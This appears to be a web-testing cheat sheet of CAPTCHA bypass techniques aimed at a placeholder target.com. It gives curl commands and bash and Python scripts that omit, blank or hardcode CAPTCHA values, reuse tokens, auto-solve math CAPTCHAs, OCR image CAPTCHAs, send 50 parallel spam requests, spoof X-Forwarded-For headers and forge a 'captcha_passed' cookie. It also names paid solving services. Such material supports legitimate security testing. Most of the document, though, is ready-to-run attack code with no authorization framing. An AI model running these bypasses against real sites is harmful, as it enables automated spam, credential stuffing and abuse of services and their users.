# 1. Parameter Removal Test

```bash
# Remove 'captcha' parameter entirely
curl -X POST https://target.com/login \
  -d "username=test&password=test"
# Remove 'g-recaptcha-response'
# Remove 'h-captcha-response'
# Remove 'cf-turnstile-response'
```

# 2. Empty Value Test

```bash
curl -X POST https://target.com/login \
  -d "username=test&password=test&captcha="
```

# 3. Static Value Test

```yaml
curl -X POST https://target.com/login \
  -d "username=test&password=test&captcha=123456"
curl -X POST https://target.com/login \
  -d "username=test&password=test&g-recaptcha-response=test"
```

# 4. Check Source Code for Secrets

```bash
curl https://target.com/login | grep -i -E "(captcha|recaptcha|sitekey|token)"
# Look for:
# - data-sitekey="..."
# - g-recaptcha-response
# - hidden input values
# - JavaScript variables
```

# 6. Check API Endpoints

```yaml
# Direct API calls often skip CAPTCHA
curl -X POST https://target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"user":"test","pass":"test"}'
```

# 7. Token Reusability

```bash
# Get a valid CAPTCHA once
VALID_TOKEN="abc123def456"

# Reuse 10 times
for i in {1..10}; do
  curl -X POST https://target.com/action \
    -d "data=test&captcha=$VALID_TOKEN"
done
```

# 8. Cross-Session Reuse

```yaml
# Solve in Chrome → Copy token → Use in curl
# Or solve manually once → reuse in automated tests
```

# 9. Auto-Solve Math Problems

```python
import re
import requests

# Extract math problem from page
response = requests.get('https://target.com/form')
# Find patterns like: "What is 5 + 3?" or "3+4=?"
match = re.search(r'(\d+)\s*[+\-*/]\s*(\d+)', response.text)

if match:
    num1 = int(match.group(1))
    num2 = int(match.group(2))
    operator = match.group(0)[len(match.group(1))]
    
    # Calculate
    if operator == '+': result = num1 + num2
    elif operator == '-': result = num1 - num2
    elif operator == '*': result = num1 * num2
    elif operator == '/': result = num1 / num2
    
    # Submit
    requests.post('https://target.com/submit', 
                  data={'captcha': result})
```

# 10. Check for Limited Image Set

```bash
# Download 20 CAPTCHA images
for i in {1..20}; do
  curl https://target.com/captcha/image -o cap_$i.png
done

# Check for duplicates
md5sum *.png | sort | uniq -w 32
# If duplicates found → limited set → map them
```

# 11. Quick OCR Test

```python
# Install: pip install pytesseract pillow
# apt-get install tesseract-ocr

python3 -c "
from PIL import Image
import pytesseract
img = Image.open('captcha.png')
print(pytesseract.image_to_string(img))
"
```

# 12. Flood Test

```bash
# Test if CAPTCHA prevents flooding
for i in {1..50}; do
  curl -X POST https://target.com/action \
    -d "data=spam$i" &
done
# Check if requests succeed without CAPTCHA
```

# 13. IP Rotation Test

```bash
# Test if CAPTCHA is IP-based
curl -H "X-Forwarded-For: 1.1.1.1" https://target.com/form
curl -H "X-Forwarded-For: 2.2.2.2" https://target.com/form
```

## **🎯 Quick Wins Checklist**

### **High Success Rate Tests:**

```bash
# 1. Remove parameter ✓
curl -d "user=test&pass=test"  # no captcha

# 2. Empty value ✓
curl -d "user=test&pass=test&captcha="

# 3. Static "test" ✓
curl -d "user=test&pass=test&captcha=test"

# 4. Reuse old token ✓
curl -d "user=test&pass=test&captcha=PREVIOUS_VALID_TOKEN"

# 5. Direct API endpoint ✓
curl -X POST /api/action  # not /web/action
```

### Common Vulnerable Patterns:

- **Client-side only validation** (check network tab)
    
- **Same CAPTCHA for all users** (global token)
    
- **No expiration** (token works forever)
    
- **CAPTCHA not required for API** (only for web UI)

## **⚡ 5-Minute Test Script**

```bash
#!/bin/bash
TARGET="https://target.com/login"

echo "1. Testing parameter removal..."
curl -X POST "$TARGET" -d "username=test&password=test"

echo "2. Testing empty CAPTCHA..."
curl -X POST "$TARGET" -d "username=test&password=test&captcha="

echo "3. Testing static values..."
for val in "123456" "test" "abc" "success" "valid"; do
  curl -X POST "$TARGET" -d "username=test&password=test&captcha=$val"
done

echo "4. Checking for CAPTCHA in source..."
curl "$TARGET" | grep -i -E "(sitekey|captcha|recaptcha)" | head -5

echo "5. Testing session cookie..."
curl -c cookies.txt "$TARGET"
curl -b "captcha_passed=1" "$TARGET"
```

## **🚨 Critical Vulnerabilities**

### **1. No Server-Side Validation**

```bash
# CAPTCHA only checked in JavaScript
# Bypass: Disable JS or call API directly
```

### **2. Global CAPTCHA Token**

```bash
# Same token works for all users/sessions
# Find in source: var captchaToken = "abc123";
```

### **3. CAPTCHA Not Required After First Success**

```bash
# Solve once → session marked as "verified"
# All subsequent actions skip CAPTCHA
```

### **4. Math CAPTCHA with Predictable Answers**

```yaml
# Answers follow pattern
# Example: Always sum of two numbers
```

## **🛠️ Tools & Services**

- **2Captcha** / **Anti-Captcha** (paid solving services)
    
- **Tesseract OCR** (open source)
    
- **Burp Suite CAPTCHA plugin**
    
- **Selenium + OCR** for automation
